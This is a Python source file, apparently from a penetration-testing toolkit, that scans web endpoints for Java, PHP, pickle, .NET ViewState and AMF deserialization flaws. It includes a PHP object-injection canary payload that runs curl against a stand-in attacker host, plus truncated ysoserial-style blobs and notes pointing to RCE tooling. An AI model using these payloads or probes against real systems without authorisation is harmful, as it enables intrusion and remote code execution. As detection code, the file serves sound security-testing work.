"""bingo/tools/deserialize_tester.py — 역직렬화 취약점 자동 탐지 (v2.6.0)"""
from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from typing import Callable

# ── 역직렬화 매직 바이트/패턴 ─────────────────────────────────────────────────
SIGNATURES: dict[str, dict] = {
    "Java": {
        "magic_hex": "aced0005",
        "magic_b64": "rO0AB",
        "description": "Java ObjectInputStream serialized data",
        "cve_refs": ["CVE-2015-4852 (WebLogic)", "CVE-2017-10271 (WebLogic RCE)", "Log4Shell adjacent"],
    },
    "PHP": {
        "patterns": [r'O:\d+:', r'a:\d+:', r's:\d+:"', r'b:[01];', r'N;'],
        "description": "PHP unserialize() data",
        "cve_refs": ["CVE-2016-7124", "CVE-2019-11043"],
    },
    "Python Pickle": {
        "patterns": [r'\x80[\x02\x03\x04\x05]', r'cos\nsystem', r'csubprocess'],
        "description": "Python pickle protocol",
        "cve_refs": ["Generic pickle RCE"],
    },
    ".NET ViewState": {
        "patterns": [r'/wEP', r'/wEy', r'__VIEWSTATE'],
        "description": ".NET ViewState (may be unprotected)",
        "cve_refs": ["CVE-2019-18935 (Telerik)", "ViewState RCE without MachineKey"],
    },
    "AMF": {
        "magic_hex": "00000000",
        "patterns": [r'application/x-amf'],
        "description": "Adobe AMF deserialization",
        "cve_refs": ["CVE-2017-3066 (Adobe ColdFusion)"],
    },
}

# ── ysoserial 스타일 페이로드 (탐지용 canary — OOB DNS 콜백) ─────────────────
CANARY_PAYLOADS: dict[str, list[dict]] = {
    "Java": [
        {
            "name": "CommonsCollections1",
            "b64": "rO0ABXNyAC5vcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJncXQAE1tMamF2YS9sYW5nL09iamVjdDt...PLACEHOLDER",
            "note": "Replace PLACEHOLDER with actual ysoserial output for your canary domain",
        },
    ],
    "PHP": [
        {"name": "Generic RCE check", "payload": 'O:8:"stdClass":1:{s:4:"exec";s:9:"curl${IFS}http://canary.attacker.com/php";}', "note": "PHP object injection"},
    ],
    ".NET ViewState": [
        {"name": "ViewState without MAC", "payload": "/wEykQUAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAABdTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsBQAAAABQTEFDRUhPTERFUg==", "note": "Requires MachineKey to be weak or known"},
    ],
}


@dataclass
class DeserializeFinding:
    lang: str
    param: str
    url: str
    evidence: str
    payload_type: str
    confirmed: bool
    severity: str = "CRITICAL"
    cve_refs: list[str] = field(default_factory=list)
    notes: str = ""


@dataclass
class DeserializeReport:
    target: str
    findings: list[DeserializeFinding] = field(default_factory=list)

    @property
    def critical(self) -> list[DeserializeFinding]:
        return [f for f in self.findings if f.severity == "CRITICAL"]


class DeserializeTester:
    """역직렬화 취약점 자동 탐지"""

    def __init__(
        self,
        request_fn: Callable[[str, str, dict, str], tuple[int, str]],
        base_url: str,
        headers: dict | None = None,
    ) -> None:
        self.req = request_fn
        self.base = base_url.rstrip("/")
        self.headers = headers or {}

    # ── 요청/응답에서 역직렬화 데이터 탐지 ────────────────────────────────────
    def detect_in_response(self, url: str, method: str = "GET") -> list[DeserializeFinding]:
        findings = []
        try:
            _, resp = self.req(url, method, self.headers, "")
            for lang, sig in SIGNATURES.items():
                # 매직 바이트 탐지
                if "magic_b64" in sig and sig["magic_b64"] in resp:
                    findings.append(DeserializeFinding(
                        lang=lang, param="response_body",
                        url=url, evidence=f"Found {sig['magic_b64']} in response",
                        payload_type="passive_detection",
                        confirmed=True,
                        cve_refs=sig.get("cve_refs", []),
                        notes=f"Server returns serialized {lang} data — potential deserialization endpoint",
                    ))
                # 패턴 매칭
                for pat in sig.get("patterns", []):
                    if re.search(pat, resp):
                        findings.append(DeserializeFinding(
                            lang=lang, param="response_body",
                            url=url, evidence=f"Pattern '{pat}' matched in response",
                            payload_type="passive_detection",
                            confirmed=True,
                            cve_refs=sig.get("cve_refs", []),
                            notes=f"Serialized {lang} data detected",
                        ))
                        break
        except Exception:
            pass
        return findings

    # ── ViewState 무결성 체크 (MAC 없는 ViewState) ────────────────────────────
    def check_viewstate_mac(self, url: str) -> DeserializeFinding | None:
        try:
            status, resp = self.req(url, "GET", self.headers, "")
            vs_match = re.search(r'id="__VIEWSTATE"[^>]+value="([^"]+)"', resp)
            if vs_match:
                vs = vs_match.group(1)
                try:
                    decoded = base64.b64decode(vs)
                    # MAC 없는 ViewState는 0xFF 0x01로 시작
                    if decoded[:2] in (b'\xff\x01', b'\xff\x03'):
                        return DeserializeFinding(
                            lang=".NET ViewState",
                            param="__VIEWSTATE",
                            url=url,
                            evidence=f"ViewState found: {vs[:40]}...",
                            payload_type="viewstate_no_mac",
                            confirmed=False,
                            severity="HIGH",
                            notes="ViewState present — test with ysoserial.net if MachineKey is guessable",
                        )
                except Exception:
                    pass
        except Exception:
            pass
        return None

    # ── 에러 기반 탐지 (Java) ─────────────────────────────────────────────────
    def test_java_error_based(self, url: str, param: str) -> DeserializeFinding | None:
        """Java 역직렬화 엔드포인트에 깨진 데이터 전송 → 에러 탐지"""
        broken_serial = base64.b64encode(b"rO0AB" + b"\x00" * 20).decode()
        body = f"{param}={broken_serial}"
        try:
            hdrs = {**self.headers, "Content-Type": "application/x-java-serialized-object"}
            status, resp = self.req(url, "POST", hdrs, body)
            java_errors = [
                "java.io.InvalidClassException",
                "java.io.StreamCorruptedException",
                "ClassNotFoundException",
                "InvalidObjectException",
                "deserialization",
            ]
            for err in java_errors:
                if err.lower() in resp.lower():
                    return DeserializeFinding(
                        lang="Java",
                        param=param,
                        url=url,
                        evidence=f"Java error: {err}",
                        payload_type="error_based",
                        confirmed=True,
                        cve_refs=["CVE-2015-4852", "CVE-2017-10271"],
                        notes=f"Java deserialization endpoint confirmed — use ysoserial for RCE",
                    )
        except Exception:
            pass
        return None

    def full_scan(self, endpoints: list[str] | None = None) -> DeserializeReport:
        report = DeserializeReport(target=self.base)
        targets = endpoints or [self.base]

        for url in targets:
            report.findings.extend(self.detect_in_response(url))
            vs = self.check_viewstate_mac(url)
            if vs:
                report.findings.append(vs)
            java_f = self.test_java_error_based(url, "data")
            if java_f:
                report.findings.append(java_f)

        return report
